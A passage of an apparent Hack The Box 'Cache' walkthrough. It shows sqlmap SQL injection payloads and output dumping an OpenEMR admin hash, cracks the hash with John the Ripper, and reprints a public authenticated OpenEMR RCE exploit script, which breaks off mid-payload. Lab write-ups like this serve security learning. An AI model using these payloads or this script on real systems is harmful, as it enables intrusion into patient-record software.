|</span><br><span class="line">| gacl_groups_axo_map                   |</span><br><span class="line">| gacl_phpgacl                          |</span><br><span class="line">| geo_country_reference                 |</span><br><span class="line">| geo_zone_reference                    |</span><br><span class="line">| globals                               |</span><br><span class="line">| gprelations                           |</span><br><span class="line">| history_data                          |</span><br><span class="line">| icd10_dx_order_code                   |</span><br><span class="line">| icd10_gem_dx_10_9                     |</span><br><span class="line">| icd10_gem_dx_9_10                     |</span><br><span class="line">| icd10_gem_pcs_10_9                    |</span><br><span class="line">| icd10_gem_pcs_9_10                    |</span><br><span class="line">| icd10_pcs_order_code                  |</span><br><span class="line">| icd10_reimbr_dx_9_10                  |</span><br><span class="line">| icd10_reimbr_pcs_9_10                 |</span><br><span class="line">| icd9_dx_code                          |</span><br><span class="line">| icd9_dx_long_code                     |</span><br><span class="line">| icd9_sg_code                          |</span><br><span class="line">| icd9_sg_long_code                     |</span><br><span class="line">| immunization_observation              |</span><br><span class="line">| immunizations                         |</span><br><span class="line">| insurance_companies                   |</span><br><span class="line">| insurance_data                        |</span><br><span class="line">| insurance_numbers                     |</span><br><span class="line">| issue_encounter                       |</span><br><span class="line">| issue_types                           |</span><br><span class="line">| lang_constants                        |</span><br><span class="line">| lang_custom                           |</span><br><span class="line">| lang_definitions                      |</span><br><span class="line">| lang_languages                        |</span><br><span class="line">| layout_group_properties               |</span><br><span class="line">| layout_options                        |</span><br><span class="line">| lbf_data                              |</span><br><span class="line">| lbt_data                              |</span><br><span class="line">| list_options                          |</span><br><span class="line">| lists                                 |</span><br><span class="line">| lists_touch                           |</span><br><span class="line">| log_comment_encrypt                   |</span><br><span class="line">| log_validator                         |</span><br><span class="line">| medex_icons                           |</span><br><span class="line">| medex_outgoing                        |</span><br><span class="line">| medex_prefs                           |</span><br><span class="line">| medex_recalls                         |</span><br><span class="line">| misc_address_book                     |</span><br><span class="line">| module_acl_group_settings             |</span><br><span class="line">| module_acl_sections                   |</span><br><span class="line">| module_acl_user_settings              |</span><br><span class="line">| module_configuration                  |</span><br><span class="line">| modules                               |</span><br><span class="line">| modules_hooks_settings                |</span><br><span class="line">| modules_settings                      |</span><br><span class="line">| multiple_db                           |</span><br><span class="line">| notes                                 |</span><br><span class="line">| notification_log                      |</span><br><span class="line">| notification_settings                 |</span><br><span class="line">| onotes                                |</span><br><span class="line">| onsite_documents                      |</span><br><span class="line">| onsite_mail                           |</span><br><span class="line">| onsite_messages                       |</span><br><span class="line">| onsite_online                         |</span><br><span class="line">| onsite_portal_activity                |</span><br><span class="line">| onsite_signatures                     |</span><br><span class="line">| openemr_module_vars                   |</span><br><span class="line">| openemr_modules                       |</span><br><span class="line">| openemr_postcalendar_categories       |</span><br><span class="line">| openemr_postcalendar_events           |</span><br><span class="line">| openemr_postcalendar_limits           |</span><br><span class="line">| openemr_postcalendar_topics           |</span><br><span class="line">| openemr_session_info                  |</span><br><span class="line">| patient_access_offsite                |</span><br><span class="line">| patient_access_onsite                 |</span><br><span class="line">| patient_birthday_alert                |</span><br><span class="line">| patient_data                          |</span><br><span class="line">| patient_portal_menu                   |</span><br><span class="line">| patient_reminders                     |</span><br><span class="line">| patient_tracker                       |</span><br><span class="line">| patient_tracker_element               |</span><br><span class="line">| payment_gateway_details               |</span><br><span class="line">| payments                              |</span><br><span class="line">| pharmacies                            |</span><br><span class="line">| phone_numbers                         |</span><br><span class="line">| pma_bookmark                          |</span><br><span class="line">| pma_column_info                       |</span><br><span class="line">| pma_history                           |</span><br><span class="line">| pma_pdf_pages                         |</span><br><span class="line">| pma_relation                          |</span><br><span class="line">| pma_table_coords                      |</span><br><span class="line">| pma_table_info                        |</span><br><span class="line">| pnotes                                |</span><br><span class="line">| prescriptions                         |</span><br><span class="line">| prices                                |</span><br><span class="line">| procedure_answers                     |</span><br><span class="line">| procedure_order                       |</span><br><span class="line">| procedure_order_code                  |</span><br><span class="line">| procedure_providers                   |</span><br><span class="line">| procedure_questions                   |</span><br><span class="line">| procedure_report                      |</span><br><span class="line">| procedure_result                      |</span><br><span class="line">| procedure_type                        |</span><br><span class="line">| product_registration                  |</span><br><span class="line">| product_warehouse                     |</span><br><span class="line">| registry                              |</span><br><span class="line">| report_itemized                       |</span><br><span class="line">| report_results                        |</span><br><span class="line">| rule_action                           |</span><br><span class="line">| rule_action_item                      |</span><br><span class="line">| rule_filter                           |</span><br><span class="line">| rule_patient_data                     |</span><br><span class="line">| rule_reminder                         |</span><br><span class="line">| rule_target                           |</span><br><span class="line">| sequences                             |</span><br><span class="line">| shared_attributes                     |</span><br><span class="line">| standardized_tables_track             |</span><br><span class="line">| supported_external_dataloads          |</span><br><span class="line">| syndromic_surveillance                |</span><br><span class="line">| template_users                        |</span><br><span class="line">| therapy_groups                        |</span><br><span class="line">| therapy_groups_counselors             |</span><br><span class="line">| therapy_groups_participant_attendance |</span><br><span class="line">| therapy_groups_participants           |</span><br><span class="line">| transactions                          |</span><br><span class="line">| user_settings                         |</span><br><span class="line">| users                                 |</span><br><span class="line">| users_facility                        |</span><br><span class="line">| users_secure                          |</span><br><span class="line">| valueset                              |</span><br><span class="line">| voids                                 |</span><br><span class="line">| x12_partners                          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line">[09:58:45] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:58:45 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h3 id="3-爆users-secure表字段"><a href="#3-爆users-secure表字段" class="headerlink" title="3.爆users_secure表字段"></a>3.爆users_secure表字段</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure --columns --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [(]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:37:10 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:37:10] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:37:11] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:37:11] [INFO] testing connection to the target URL</span><br><span class="line">[10:37:11] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:37:11] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:37:11] [INFO] fetching columns for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;id&#x27;,&#x27;bigint(20)&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;username&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;password&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;salt&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;last_update&#x27;,&#x27;timestamp&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;password_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;salt_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;password_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;salt_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">Table: users_secure</span><br><span class="line">[9 columns]</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| Column            | Type         |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| id                | bigint(20)   |</span><br><span class="line">| last_update       | timestamp    |</span><br><span class="line">| password          | varchar(255) |</span><br><span class="line">| password_history1 | varchar(255) |</span><br><span class="line">| password_history2 | varchar(255) |</span><br><span class="line">| salt              | varchar(255) |</span><br><span class="line">| salt_history1     | varchar(255) |</span><br><span class="line">| salt_history2     | varchar(255) |</span><br><span class="line">| username          | varchar(255) |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line"></span><br><span class="line">[10:37:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:37:15 /2020-10-01/</span><br></pre></td></tr></table></figure><h3 id="4-爆数据"><a href="#4-爆数据" class="headerlink" title="4.爆数据"></a>4.爆数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure -C username,password --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:47:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:47:00] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:47:00] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:47:00] [INFO] testing connection to the target URL</span><br><span class="line">[10:47:01] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:47:01] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:47:01] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">Database: openemr</span><br><span class="line">Table: users_secure</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| username      | password                                                     |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line">| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |</span><br><span class="line">+---------------+--------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[10:47:01] [INFO] table &#x27;openemr.users_secure&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/hms.htb/dump/openemr/users_secure.csv&#x27;</span><br><span class="line">[10:47:01] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:47:01 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x09-破解hash值"><a href="#0x09-破解hash值" class="headerlink" title="0x09.破解hash值"></a>0x09.破解hash值</h2><p><code>破解为xxxxxx</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat hash </span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$05</span><span class="variable">$l2sTLIG6GTBeyBf7TAKL6</span>.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.</span></span><br><span class="line">root@JIYE:~/htb/cache# john -w=/usr/share/wordlists/rockyou.txt hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 32 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">xxxxxx           (?)</span><br><span class="line">1g 0:00:00:00 DONE (2020-10-01 10:58) 5.555g/s 4800p/s 4800c/s 4800C/s tristan..felipe</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x10-Google搜索exp"><a href="#0x10-Google搜索exp" class="headerlink" title="0x10.Google搜索exp"></a>0x10.Google搜索exp</h2><p><code>OpenEMR &lt; 5.0.1 - (Authenticated) Remote Code Execution</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDUxNjE=">exp地址<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">ap = argparse.ArgumentParser(description=&quot;OpenEMR RCE&quot;)</span><br><span class="line">ap.add_argument(&quot;host&quot;, help=&quot;Path to OpenEMR (Example: http://127.0.0.1/openemr).&quot;)</span><br><span class="line">ap.add_argument(&quot;-u&quot;, &quot;--user&quot;, help=&quot;Admin username&quot;)</span><br><span class="line">ap.add_argument(&quot;-p&quot;, &quot;--password&quot;, help=&quot;Admin password&quot;)</span><br><span class="line">ap.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command to run.&quot;)</span><br><span class="line">args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">ascii = &quot;&gt; .---.  ,---.  ,---.  .-. .-.,---.          ,---.    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt; )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;&gt;(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) &lt;\r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;   =&#123;&gt;   P R O J E C T    I N S E C U R I T Y   &lt;&#125;=    \r\n&quot;</span><br><span class="line">ascii+= &quot;                                                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Twitter : &gt;@Insecurity&lt;                       \r\n&quot;</span><br><span class="line">ascii+= &quot;         Site    : &gt;insecurity.sh&lt;                     \r\n&quot;</span><br><span class="line"></span><br><span class="line">green = &quot;\033[1;32m&quot;</span><br><span class="line">red = &quot;\033[1;31m&quot;</span><br><span class="line">clear = &quot;\033[0m&quot;</span><br><span class="line"></span><br><span class="line">load = &quot;[&gt;$&lt;] &quot;.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">err = &quot;[&gt;-&lt;] &quot;.replace(&quot;&gt;&quot;, red).replace(&quot;&lt;&quot;, clear)</span><br><span class="line">intro = ascii.replace(&quot;&gt;&quot;, green).replace(&quot;&lt;&quot;, clear)</span><br><span class="line"></span><br><span class="line">print(intro)</span><br><span class="line"></span><br><span class="line">with requests.session() as s:</span><br><span class="line">    login = &#123;&quot;new_login_session_management&quot;: &quot;1&quot;,</span><br><span class="line">            &quot;authProvider&quot;: &quot;Default&quot;,</span><br><span class="line">            &quot;authUser&quot;: args.user,</span><br><span class="line">            &quot;clearPass&quot;: args.password,</span><br><span class="line">            &quot;languageChoice&quot;: &quot;1&quot;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    print(load + &quot;Authenticating with &quot; + args.user + &quot;:&quot; + args.password)</span><br><span class="line">    r = s.post(args.host + &quot;/interface/main/main_screen.php?auth=login&amp;site=default&quot;, data=login)</span><br><span class="line">    if &quot;login_screen.php?error=1&amp;site=&quot; in r.text:</span><br><span class="line">        print(err + &quot;Failed to Login.&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    # This will rewrite and replace your current GLOBALS, please modify this if you don&#x27;t want that.</span><br><span class="line">    payload = &quot;form_save=Save&amp;srch_desc=&amp;form_0=main_info.php&amp;form_1=..%2F..%2Finterface&quot;</span><br><span class="line">    payload += &quot;%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&amp;form_2=1&amp;form_3=tabs_&quot;</span><br><span class="line">    payload += &quot;style_full.css&amp;form_4=style_light.css&amp;form_5=__default__&amp;form_6=__default&quot;</span><br><span class="line">    payload += &quot;__&amp;form_7=1&amp;form_8=0&amp;form_9=175&amp;form_10=OpenEMR&amp;form_12=1&amp;form_13=0&amp;form_&quot;</span><br><span class="line">    payload += &quot;14=0&amp;form_16=1&amp;form_21=1&amp;form_22=1&amp;form_23=1&amp;form_24=1&amp;form_25=http%3A%2F&quot;</span><br><span class="line">    payload += &quot;%2Fopen-emr.org%2F&amp;form_26=&amp;form_27=20&amp;form_28=10&amp;form_30=0&amp;form_31=5&amp;for&quot;</span><br><span class="line">    payload += &quot;m_32=0&amp;form_37=English+%28Standard%29&amp;form_38=1&amp;form_42=1&amp;form_43=1&amp;form_&quot;</span><br><span class="line">    payload += &quot;44=1&amp;form_45=1&amp;form_46=1&amp;form_47=1&amp;form_48=1&amp;form_49=1&amp;form_50=1&amp;form_51=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_52=0&amp;form_53=&amp;form_54=2&amp;form_55=.&amp;form_56=%2C&amp;form_57=%24&amp;form_58=&quot;</span><br><span class="line">    payload += &quot;0&amp;form_59=3&amp;form_60=6%2C0&amp;form_61=0&amp;form_62=0&amp;form_63=_blank&amp;form_69=1&amp;fo&quot;</span><br><span class="line">    payload += &quot;rm_70=1&amp;form_77=1&amp;form_79=&amp;form_80=&amp;form_81=&amp;form_84=1&amp;form_85=1&amp;form_87=&quot;</span><br><span class="line">    payload += &quot;1&amp;form_89=1&amp;form_90=1&amp;form_91=1&amp;form_92=Y1&amp;form_93=1&amp;form_94=2&amp;form_95=0&amp;&quot;</span><br><span class="line">    payload += &quot;form_97=14&amp;form_98=11&amp;form_99=24&amp;form_100=20&amp;form_102=1&amp;form_103=0&amp;form_1&quot;</span><br><span class="line">    payload += &quot;04=0&amp;form_105=ICD10&amp;form_106=1&amp;form_107=1&amp;form_112=3&amp;form_115=1&amp;form_116=&quot;</span><br><span class="line">    payload += &quot;&amp;form_119=1.00&amp;form_121=0&amp;form_123=&amp;form_125=30&amp;form_126=&amp;form_127=60&amp;for&quot;</span><br><span class="line">    payload += &quot;m_128=&amp;form_129=90&amp;form_130=&amp;form_131=120&amp;form_132=&amp;form_133=150&amp;form_134&quot;</span><br><span class="line">    payload += &quot;=&amp;form_135=1&amp;form_138=1&amp;form_139=1&amp;form_141=1&amp;form_142=0&amp;form_143=localho&quot;</span><br><span class="line">    payload += &quot;st&amp;form_144=&amp;form_145=&amp;form_146=5984&amp;form_147=&amp;form_150=Patient+ID+card&amp;f&quot;</span><br><span class="line">    payload += &quot;orm_151=Patient+Photograph&amp;form_152=Lab+Report&amp;form_153=Lab+Report&amp;form_1&quot;</span><br><span class="line">    payload += &quot;55=100&amp;form_157=8&amp;form_158=17&amp;form_159=15&amp;form_160=day&amp;form_161=1&amp;form_16&quot;</span><br><span class="line">    payload += &quot;2=2&amp;form_163=1&amp;form_164=10&amp;form_165=10&amp;form_166=15&amp;form_167=20&amp;form_168=1&quot;</span><br><span class="line">    payload += &quot;&amp;form_169=%23FFFFFF&amp;form_170=%23E6E6FF&amp;form_171=%23E6FFE6&amp;form_172=%23FFE&quot;</span><br><span class="line">    payload += &quot;6FF&amp;form_173=1&amp;form_174=0&amp;form_176=1&amp;form_177=1&amp;form_178=1&amp;form_181=1&amp;for&quot;</span><br><span class="line">    payload += &quot;m_182=1&amp;form_183=1&amp;form_184=1&amp;form_185=D0&amp;form_186=D0&amp;form_187=0%3A20&amp;for&quot;</span><br><span class="line">    payload += &quot;m_188=0&amp;form_190=33&amp;form_191=0&amp;form_194=7200&amp;form_198=1&amp;form_199=0&amp;form_2&quot;</span><br><span class="line">    payload += 